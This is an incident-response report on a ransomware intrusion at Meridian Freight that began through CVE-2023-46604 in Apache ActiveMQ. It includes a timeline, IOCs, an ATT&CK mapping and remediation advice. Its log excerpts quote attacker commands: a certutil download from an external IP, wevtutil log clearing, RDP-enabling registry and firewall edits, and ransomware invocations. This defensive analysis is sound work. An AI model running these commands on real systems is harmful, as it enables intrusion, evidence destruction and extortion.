# Apache ActiveMQ Exploit Leads to Domain-Wide Ransomware Deployment

**Case Reference:** MERIDIAN-2026-0320
**Client:** Meridian Freight
**Report Date:** March 21, 2026
**Analyst(s):** [Your Name]
**Classification:** TLP:AMBER — Internal / Client Use Only

---

## Key Takeaways

- A threat actor exploited **CVE-2023-46604**, a critical remote code execution vulnerability in Apache ActiveMQ's OpenWire protocol, on an internet-facing server (`MSG-BROKER-01`). Exploitation was achieved using a Java Spring `ClassPathXmlApplicationContext` class combined with a malicious remote XML bean definition.
- After establishing a foothold, the threat actor performed a privilege verification check (`getsystem`-style named pipe technique), accessed **LSASS process memory** to harvest credentials, and used a dumped backup-service account (`svc-veeam`) to move laterally to **both domain controllers**, a backup server, and a file server.
- The threat actor cleared Windows Event Logs, disabled Windows Defender on an Exchange server, and installed a disguised remote-access tool (masquerading as Microsoft Quick Assist) as a persistent Windows service communicating over a non-standard C2 port.
- A domain-wide internal network scan (`10.42.0.0/16`) was used to identify further RDP/SMB-accessible targets, directly informing a second wave of lateral movement.
- The intrusion culminated in **ransomware deployment across nine confirmed hosts** — including both domain controllers, the backup server, the file server, an application server, and four end-user workstations — using a self-propagating tool (`cx_secure.exe` / `cx_agent.exe`) invoked with a shared static passphrase and a PsExec-style spreading flag (`-psex`).
- **Time to Ransomware (TTR)** for this intrusion was approximately **2 hours 17 minutes** — from initial exploitation (15:05 UTC) to the first confirmed ransom note on BKUP-SRV-01 (17:22 UTC, same day) — indicating an unusually fast, largely manual, hands-on-keyboard operation rather than an automated or multi-day campaign.

---

## Case Summary

This intrusion began on March 20, 2026, when a threat actor exploited **CVE-2023-46604** on an exposed Apache ActiveMQ server (`MSG-BROKER-01.meridianfreight.local`). The threat actor achieved remote code execution by submitting a crafted OpenWire `ExceptionResponse` message referencing the Java Spring class `org.springframework.context.support.ClassPathXmlApplicationContext`, pointed at a remote, attacker-hosted XML bean definition. The retrieved XML defined a `ProcessBuilder`-based bean, which executed an OS command under the security context of the ActiveMQ service account (`svc-activemq`).

Using this initial command execution, the threat actor downloaded a payload (`mNcQpLxTfA.exe`) via `certutil.exe`, executed it, and established an outbound C2 channel to `185.220.101.47`. Approximately 27 minutes later, the threat actor performed a named-pipe-based execution verification check, then accessed LSASS process memory on the beachhead host — the first of several LSASS-access events observed throughout the intrusion. A quick check of the `Domain Admins` group followed shortly after.

Roughly 20 minutes later, the threat actor pivoted using `MERIDIAN\svc-veeam`, a privileged backup-service account, executing obfuscated, in-memory PowerShell (a reflective loader pattern) against both domain controllers, the backup server, and the file server. LSASS was accessed on every host in this wave, consistent with systematic, repeated credential harvesting across critical infrastructure.

The threat actor then shifted to defense evasion and persistence: RDP was enabled via registry and firewall modification, the staging batch file was deleted, and all three core Windows Event Logs (System, Application, Security) were cleared using `wevtutil.exe`. A disguised remote-access tool — installed as `QuickAssist.exe`, masquerading as Microsoft's legitimate support tool — was silently installed as a Windows service (`QuickAssistSvc`), providing a second, redundant access channel that beaconed to the C2 IP over a non-standard port (TCP/6761). Windows Defender was separately disabled on a previously-unseen host, `EXCH-01`, under the same compromised service account.

Following an internal reconnaissance phase — a full `/16` network scan targeting RDP, SMB, RPC, and WinRM ports — the threat actor staged three additional tools (`SysUtilScan.exe`, `cx_secure.exe`, `cx_agent.exe`) and began a second, RDP-driven wave of lateral movement, this time using `mstsc.exe` interactively from the beachhead host. On the backup server and file server, `cx_secure.exe` was executed with an explicit path and password flag; on subsequent hosts — both domain controllers, an application server, and four end-user workstations — `cx_agent.exe` was dropped into each logged-on user's `Downloads` folder and executed with a `-psex` flag, consistent with a PsExec-style self-propagation/deployment mode.

Ransom notes (`HOW_TO_RESTORE.txt`) were written to shared drives, public folders, and user desktops across all nine affected hosts, and desktop wallpapers were modified to ensure visibility of the ransom demand. Critically, both domain controllers and the organization's backup server were among the encrypted hosts, materially complicating recovery. A shared static passphrase (`9f2C71xQmZ44`) was used across all ransomware invocations observed.

---

## Initial Access

**ATT&CK Technique:** T1190 – Exploit Public-Facing Application

The intrusion began with exploitation of an internet-facing Apache ActiveMQ instance hosted on `MSG-BROKER-01.meridianfreight.local`, running under the service account `svc-activemq`, via **CVE-2023-46604** (CVSS 10.0).

The vulnerability lies in OpenWire's handling of the `ExceptionResponse` type, which allows an unauthenticated remote attacker to specify an arbitrary Java class name and constructor argument. The threat actor supplied the class `org.springframework.context.support.ClassPathXmlApplicationContext` along with a URL pointing to an attacker-hosted Spring bean XML file. Because ActiveMQ instantiates the referenced class without validation, the broker fetched and parsed the remote XML — which was cached locally as `C:\ProgramData\ActiveMQ\tmp\bean-9b41ee.xml`.

```
15:14:02  java.exe (ActiveMQ) → outbound connection → 185.220.101.47
15:14:04  java.exe writes C:\ProgramData\ActiveMQ\tmp\bean-9b41ee.xml
```

The XML defined a Spring bean using a `ProcessBuilder`-equivalent constructor, resulting in arbitrary OS command execution under `svc-activemq`. This was used to invoke `certutil.exe` (LOLBin abuse) to download the primary payload:

```
15:14:06  cmd.exe /c certutil.exe -urlcache -f http://185.220.101.47/upd/mNcQpLxTfA.exe %TEMP%\mNcQpLxTfA.exe
15:14:18  cmd.exe executes C:\Users\svc-activemq\AppData\Local\Temp\mNcQpLxTfA.exe
15:14:22  mNcQpLxTfA.exe → outbound connection → 185.220.101.47 (independent C2 channel established)
```

*Note: No evidence of a prior/failed exploitation attempt was identified in the reviewed telemetry; this appears to be a single successful exploitation event, unlike some publicly documented ActiveMQ CVE-2023-46604 intrusions involving multiple exploitation rounds.*

## Execution

**ATT&CK Techniques:** T1059.001 – PowerShell · T1059.003 – Windows Command Shell · T1053/T1569.002 – Service Execution

Beyond the initial RCE-driven command execution described above, the threat actor's primary execution vector throughout the intrusion was `cmd.exe` and obfuscated PowerShell, invoked either directly by the implant or via remotely-created Windows services (parent process `services.exe`), consistent with PsExec-style or WMI-based remote service creation:

```
16:06:07  services.exe → cmd.exe → powershell.exe -nop -w hidden -encodedcommand JABzAD0A...   (DC-01)
```

Decoded, the payload begins:
```
$s=New-Object IO.MemoryStream([Convert]::FromBase64String(...
```
This decodes to a reflective, in-memory loader pattern (Base64 → MemoryStream → in-memory execution), leaving no corresponding payload file on disk — consistent with a fileless post-exploitation module used specifically for credential access (see *Credential Access*).

## Persistence

**ATT&CK Techniques:** T1021.001 – Remote Desktop Protocol · T1543.003 – Windows Service · T1036.005 – Masquerading

The threat actor established two independent, redundant persistence mechanisms on the beachhead host:

**1. RDP Enablement**
```
16:22:47  reg add "HKLM\...\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
16:22:48  reg add "HKLM\...\WinStations\RDP-Tcp" /v PortNumber /t REG_DWORD /d 3389 /f
16:22:46  netsh advfirewall firewall add rule name="RDPAccess" dir=in action=allow protocol=TCP localport=3389
```

**2. Disguised Remote-Access Service ("QuickAssist")**
```
16:33:02  winlogon.exe drops C:\Windows\Temp\QuickAssist_Setup.exe
16:33:40  QuickAssist_Setup.exe --silent --install-service
16:33:55  drops C:\Program Files (x86)\QuickAssist\QuickAssist.exe
16:34:02  registry key created: HKLM\SYSTEM\CurrentControlSet\Services\QuickAssistSvc
16:34:30  services.exe starts QuickAssist.exe --service
16:41:03  QuickAssist.exe → outbound connection → 185.220.101.47:6761
```

The installer and binary names directly imitate Microsoft's legitimate Quick Assist support tool (Masquerading), reducing scrutiny from both allowlisting tools and manual review. The service runs as `NT AUTHORITY\SYSTEM`, restarts automatically on boot, and communicates over a non-standard C2 port (TCP/6761) rather than typical HTTPS (443).

## Defense Evasion

**ATT&CK Techniques:** T1070.001 – Clear Windows Event Logs · T1070.004 – File Deletion · T1562.004 – Impair Defenses: Firewall · T1562.001 – Impair Defenses: Disable Security Tools

Approximately six minutes after the RDP firewall rule was applied, the staging batch file used to configure it was deleted:
```
16:22:45  cmd.exe /c C:\Windows\Temp\fw_update.bat
16:28:55  FileDelete: C:\Windows\Temp\fw_update.bat
```

All three core Windows Event Logs were then cleared sequentially within a 16-second window, using `wevtutil.exe` invoked directly by the primary implant:
```
16:30:10  wevtutil.exe cl System
16:30:18  wevtutil.exe cl Application
16:30:26  wevtutil.exe cl Security
```

This anti-forensic action would have removed nearly all locally-viewable evidence of the intrusion from native Windows Event Viewer. **Sysmon telemetry, which is written to a separate log channel not targeted by `wevtutil.exe cl`, is the primary reason this intrusion remains reconstructable.**

Separately, on a previously-unseen host, `EXCH-01.meridianfreight.local`, the threat actor used the legitimate Windows utility `SystemSettingsAdminFlows.exe` (a LOLBin) under the compromised `svc-veeam` account to disable Windows Defender:
```
16:47:20  registry modification: HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\DisableAntiSpyware
```

## Credential Access

**ATT&CK Technique:** T1003.001 – OS Credential Dumping: LSASS Memory

LSASS process memory access (GrantedAccess `0x1010`, consistent with `PROCESS_VM_READ`) was observed repeatedly throughout the intrusion, on every host the threat actor gained code execution on:

| Time (UTC) | Host | Accessing Process |
|---|---|---|
| 15:41:55 | MSG-BROKER-01 (beachhead) | `mNcQpLxTfA.exe` |
| 16:06:14 | DC-01 | `powershell.exe` (reflective loader) |
| 16:09:14 | DC-02 | `powershell.exe` (reflective loader) |
| 16:12:14 | BKUP-SRV-01 | `powershell.exe` (reflective loader) |
| 16:15:14 | FILE-SRV-02 | `powershell.exe` (reflective loader) |

No dump file was observed being written to disk on any host, indicating credentials were extracted and exfiltrated in-memory over the existing C2/PowerShell channel rather than staged locally. The consistency of this behavior across five separate hosts — including both domain controllers — represents systematic, scripted credential harvesting rather than opportunistic activity, and is assessed as the source of the `svc-veeam` credentials used for all subsequent lateral movement.

## Discovery

**ATT&CK Techniques:** T1087.002 – Domain Account Discovery · T1069.002 – Domain Group Discovery · T1046 – Network Service Discovery

Following the initial credential access on the beachhead, the threat actor queried domain group membership:
```
15:46:02  net group "Domain Admins" /domain
```

Later, following the RDP/persistence phase, three tools were staged and used to perform a full internal network sweep:
```
16:52:00  mNcQpLxTfA.exe drops C:\Intel\SysUtilScan.exe
16:52:08  mNcQpLxTfA.exe drops C:\Intel\cx_secure.exe
16:52:16  mNcQpLxTfA.exe drops C:\Intel\cx_agent.exe
16:55:10  SysUtilScan.exe /scan 10.42.0.0/16
```

The scan swept the entire internal `/16` range, probing ports associated with lateral movement and remote administration (135/139/445 – RPC/SMB, 3389 – RDP, 5985 – WinRM) against approximately ten internal hosts. Every host subsequently targeted in the RDP-based ransomware deployment wave appears among this scan's destinations with the relevant port confirmed open, establishing this scan as the direct reconnaissance step driving target selection for the remainder of the intrusion.

## Lateral Movement

**ATT&CK Techniques:** T1021.001 – Remote Desktop Protocol · T1570 – Lateral Tool Transfer · T1078 – Valid Accounts

Lateral movement occurred in two distinct waves, both using the compromised `MERIDIAN\svc-veeam` account.

**Wave 1 — Remote Service Execution (PowerShell)**
Approximately 52 minutes after initial access, the threat actor used `svc-veeam` to execute obfuscated PowerShell via remotely-created services against four hosts:

| Time (UTC) | Target |
|---|---|
| 16:06 | DC-01 |
| 16:09 | DC-02 |
| 16:12 | BKUP-SRV-01 |
| 16:15 | FILE-SRV-02 |

**Wave 2 — Interactive RDP**
Following the network scan (Discovery), the threat actor conducted a second, much larger wave of lateral movement, this time via interactive RDP sessions launched manually from the beachhead host (`mstsc.exe`), spending roughly 8–15 minutes on each target before moving to the next:

| Time (UTC) | Target | Host Type | Tool Used |
|---|---|---|---|
| 17:20 | BKUP-SRV-01 | Backup Server | `cx_secure.exe -path C:\ -pass 9f2C71xQmZ44` |
| 17:29 | FILE-SRV-02 | File Server | `cx_secure.exe -path C:\ -pass 9f2C71xQmZ44` |
| 17:34 | DC-01 | Domain Controller | `cx_agent.exe -psex` |
| 17:41 | DC-02 | Domain Controller | `cx_agent.exe -psex` |
| 17:47 | WKS-045 (a.chen) | Workstation | `cx_agent.exe -psex` |
| 17:55 | WKS-078 (m.torres) | Workstation | `cx_agent.exe -psex` |
| 18:06 | APP-SRV-03 | Application Server | `cx_agent.exe -psex` |
| 18:13 | WKS-112 (k.osei) | Workstation | `cx_agent.exe -psex` |
| 18:25 | WKS-091 (r.singh) | Workstation | `cx_agent.exe -psex` |

On the four workstation targets in Wave 2, `cx_agent.exe` was staged directly inside the logged-on user's own `Downloads` folder rather than a shared staging directory, and — notably — its outbound connections were directed at `10.42.15.35` (FILE-SRV-02, itself already encrypted earlier in the same wave) rather than the external C2 IP. This suggests the threat actor repurposed an already-compromised internal file server as a secondary staging/relay point, likely to reduce outbound traffic to the external C2 infrastructure during the final deployment phase.

The `-psex` flag, consistently observed on `cx_agent.exe` across six hosts, is assessed as the tool's built-in self-propagation/remote-execution mode (a PsExec-style spreader), separate from the RDP sessions that were used to trigger the initial execution on each host.

## Command and Control

**ATT&CK Technique:** T1071 – Application Layer Protocol · T1571 – Non-Standard Port

Two independent, persistent C2 channels were established to the same external IP address, `185.220.101.47` — a known Tor exit node:

| Channel | First Seen | Port | Notes |
|---|---|---|---|
| Primary implant (`mNcQpLxTfA.exe`) | 15:14:22 | (standard/unspecified) | Established immediately following initial payload execution |
| "QuickAssist" service | 16:41:03 | TCP/6761 | Persistent, service-based, non-standard port |

Internal, secondary staging traffic to `10.42.15.35` (a compromised internal file server) was also observed during the final ransomware deployment wave, functioning as a de facto internal relay for the `cx_agent.exe` tool on newly-compromised end-user workstations (see *Lateral Movement*).

## Impact

**ATT&CK Techniques:** T1486 – Data Encrypted for Impact · T1491.001 – Internal Defacement

The intrusion culminated in ransomware deployment across **nine confirmed hosts**, spanning both domain controllers, the backup server, the file server, an application server, and four end-user workstations. Deployment was entirely RDP-driven and manually operated (see *Lateral Movement, Wave 2*).

Two related but distinctly-named binaries were used depending on host role:
- `cx_secure.exe` — used on the backup server and file server, with explicit `-path` and `-pass` arguments
- `cx_agent.exe` — used on domain controllers, an application server, and workstations, invoked with a `-psex` argument

Both produced consistent post-execution artifacts across every affected host:
```
HOW_TO_RESTORE.txt   → written to shared drives (Finance, Ops), public folders, and user desktops
HKCU\Control Panel\Desktop\Wallpaper → modified to ensure ransom note visibility
```

A single static passphrase, `9f2C71xQmZ44`, was used across every observed invocation of the encryption tooling — suggesting a shared key/license rather than per-host randomization.

### Confirmed Impacted Hosts

| Host | Role | Tool | Time of Deployment (UTC) |
|---|---|---|---|
| BKUP-SRV-01 | Backup Server | `cx_secure.exe` | 17:21 |
| FILE-SRV-02 | File Server | `cx_secure.exe` | 17:30 |
| DC-01 | Domain Controller | `cx_agent.exe -psex` | 17:35 |
| DC-02 | Domain Controller | `cx_agent.exe -psex` | 17:42 |
| WKS-045 (a.chen) | Workstation | `cx_agent.exe -psex` | 17:48 |
| WKS-078 (m.torres) | Workstation | `cx_agent.exe -psex` | 17:56 |
| APP-SRV-03 | Application Server | `cx_agent.exe -psex` | 18:07 |
| WKS-112 (k.osei) | Workstation | `cx_agent.exe -psex` | 18:14 |
| WKS-091 (r.singh) | Workstation | `cx_agent.exe -psex` | 18:26 |

**Critically, both domain controllers and the organization's backup server are among the encrypted hosts.** Compromise of backup infrastructure alongside production/domain systems is a deliberate, well-documented ransomware tactic intended to eliminate restore-from-backup as a recovery option, increasing pressure on the victim.

---

## Timeline

| Time (UTC) | Phase | Event |
|---|---|---|
| 15:05:11 | — | Baseline: ActiveMQ service running normally |
| 15:14:02 | Initial Access | CVE-2023-46604 exploited; malicious XML retrieved |
| 15:14:06–15:14:22 | Initial Access | Payload downloaded (certutil), executed, C2 established |
| 15:41:30 | Execution | Named-pipe execution verification |
| 15:41:55 | Credential Access | LSASS accessed on beachhead |
| 15:46:02 | Discovery | Domain Admins group queried |
| 16:06:05–16:15:14 | Lateral Movement / Credential Access | PowerShell-based lateral movement to DC-01, DC-02, BKUP-SRV-01, FILE-SRV-02; LSASS accessed on each |
| 16:22:45–16:22:48 | Persistence | RDP enabled (registry + firewall) |
| 16:28:55 | Defense Evasion | Staging batch file deleted |
| 16:30:10–16:30:27 | Defense Evasion | All Windows Event Logs cleared |
| 16:33:02–16:41:03 | Persistence / C2 | Disguised "QuickAssist" service installed; C2 beacon established |
| 16:47:12–16:47:20 | Persistence | Windows Defender disabled on EXCH-01 |
| 16:52:00–16:56:24 | Discovery | Tools staged; full `/16` internal network scan |
| 17:20:00–18:26:54 | Lateral Movement / Impact | RDP-driven ransomware deployment across 9 hosts |

---

## Indicators of Compromise

### Network
```
185.220.101.47            – Primary C2 (Tor exit node); also hosted initial exploit payload
185.220.101.47:6761       – Secondary C2 (QuickAssist service)
10.42.15.35                – Internal relay/staging IP (compromised FILE-SRV-02, repurposed by threat actor)
```

### Files
```
C:\ProgramData\ActiveMQ\tmp\bean-9b41ee.xml
C:\Users\svc-activemq\AppData\Local\Temp\mNcQpLxTfA.exe
C:\Windows\Temp\QuickAssist_Setup.exe
C:\Program Files (x86)\QuickAssist\QuickAssist.exe
C:\Windows\Temp\fw_update.bat  (deleted)
C:\Intel\SysUtilScan.exe       — SHA256: E5AAEBA802B2D95DE62FF7666655D02C23C19E448E3F0AE238FE4CCBE0FF0AC2
C:\Intel\cx_secure.exe         — SHA256: 1AF04E4CD30AB28580A600D917FA6EE8D763745623A899C68A14B508E07BFA4E
C:\Intel\cx_agent.exe          — SHA256: 6CAFFE36ACBA16F3FAF5DA3D4141E2652EB9F3851B0B2A92E55601AE4C89C627
C:\Users\<username>\Downloads\cx_agent.exe   (per-user staging pattern on lateral movement targets)
HOW_TO_RESTORE.txt             (ransom note; multiple paths, all 9 affected hosts)
```

### Registry
```
HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\fDenyTSConnections = 0
HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp\PortNumber = 3389
HKLM\SYSTEM\CurrentControlSet\Services\QuickAssistSvc
HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\DisableAntiSpyware  (on EXCH-01)
HKCU\Control Panel\Desktop\Wallpaper  (modified on all encrypted hosts)
```

### Accounts
```
MERIDIAN\svc-activemq   – exploited service account (initial access context)
MERIDIAN\svc-veeam      – compromised privileged backup service account (used for all lateral movement)
svc-local               – local execution context on DC-02 / APP-SRV-03 (origin/legitimacy unconfirmed — recommend investigation)
```

### Other
```
9f2C71xQmZ44             – shared static passphrase used across all ransomware tool invocations
-psex                     – observed self-propagation/execution flag on cx_agent.exe
```

---

## MITRE ATT&CK Mapping

| Tactic | Technique | ID |
|---|---|---|
| Initial Access | Exploit Public-Facing Application | T1190 |
| Execution | Command and Scripting Interpreter: PowerShell | T1059.001 |
| Execution | Command and Scripting Interpreter: Windows Command Shell | T1059.003 |
| Execution | System Services: Service Execution | T1569.002 |
| Persistence | Remote Services: RDP | T1021.001 |
| Persistence | Create or Modify System Process: Windows Service | T1543.003 |
| Defense Evasion | Masquerading: Match Legitimate Name or Location | T1036.005 |
| Defense Evasion | Indicator Removal: Clear Windows Event Logs | T1070.001 |
| Defense Evasion | Indicator Removal: File Deletion | T1070.004 |
| Defense Evasion | Impair Defenses: Disable or Modify System Firewall | T1562.004 |
| Defense Evasion | Impair Defenses: Disable or Modify Tools | T1562.001 |
| Credential Access | OS Credential Dumping: LSASS Memory | T1003.001 |
| Discovery | Account Discovery: Domain Account | T1087.002 |
| Discovery | Permission Groups Discovery: Domain Groups | T1069.002 |
| Discovery | Network Service Discovery | T1046 |
| Lateral Movement | Remote Services: RDP | T1021.001 |
| Lateral Movement | Lateral Tool Transfer | T1570 |
| Lateral Movement | Valid Accounts | T1078 |
| Command and Control | Application Layer Protocol | T1071 |
| Command and Control | Non-Standard Port | T1571 |
| Impact | Data Encrypted for Impact | T1486 |
| Impact | Defacement: Internal Defacement | T1491.001 |

---

## Unresolved Items / Recommended Follow-Up

The following items could not be conclusively answered from the telemetry reviewed and are flagged for further investigation before this report is finalized:

1. **Data Exfiltration** — No direct evidence of large-volume outbound data transfer prior to encryption was identified in the reviewed logs. This does not rule out exfiltration; targeted review of outbound traffic volume/timing to `185.220.101.47` prior to 17:20 UTC is recommended.
2. **EXCH-01 Full Scope** — Defender was disabled on this host (16:47), but no ransom note or encryption activity was confirmed in the reviewed telemetry. Requires dedicated review.
3. **`svc-local` Account Origin** — Present as the execution context on DC-02 and APP-SRV-03 during final deployment; not seen elsewhere. Needs identification (legitimate local account vs. actor-created).
4. **Unconfirmed Scanned Hosts** — `10.42.15.50`, `10.42.15.60`, `10.42.20.45` (=WKS-045, confirmed), `10.42.20.78` (=WKS-078, confirmed), `10.42.20.91` (=WKS-091, confirmed), `10.42.20.112` (=WKS-112, confirmed) were all identified in the network scan; all core targets are now accounted for, but any host scanned and not listed above should be independently verified as unaffected.
5. **Post-18:26 UTC Activity** — Reviewed telemetry contains no further threat-actor activity after 18:26 UTC. It is not established whether the threat actor ceased activity voluntarily, lost access, or simply is not represented in the available log excerpt.

---

## Recommendations (Prioritized)

**Immediate (0–24 hours)**
- Isolate all nine confirmed-impacted hosts from the network; preserve for forensic imaging before any remediation.
- Do not restore from backup until BKUP-SRV-01 repository integrity is independently verified.
- Block `185.220.101.47` (all ports) at the perimeter firewall.
- Force credential reset for `svc-veeam`, `svc-activemq`, and `krbtgt` (twice), given confirmed domain controller compromise.
- Patch or take offline the Apache ActiveMQ instance on MSG-BROKER-01 (upgrade to 5.15.16 / 5.16.7 / 5.17.6 / 5.18.3 or later).

**Short-Term (this week)**
- Full identity investigation into `svc-local`.
- Confirm scope on EXCH-01 and any hosts identified in the network scan but not yet triaged.
- Submit `cx_secure.exe`, `cx_agent.exe`, and `mNcQpLxTfA.exe` for reverse engineering / malware family identification.
- Deploy detections for `wevtutil.exe cl *`, silent service installs matching legitimate tool names, and outbound traffic to `185.220.101.47`.

**Medium-Term**
- Review and reduce standing privileges for backup service accounts across the environment (least-privilege for `svc-veeam`-equivalent accounts).
- Implement network segmentation between internet-facing services (ActiveMQ) and internal domain infrastructure.
- Enable centralized, tamper-resistant log forwarding (WEF/SIEM) so on-host log clearing cannot remove investigative evidence.
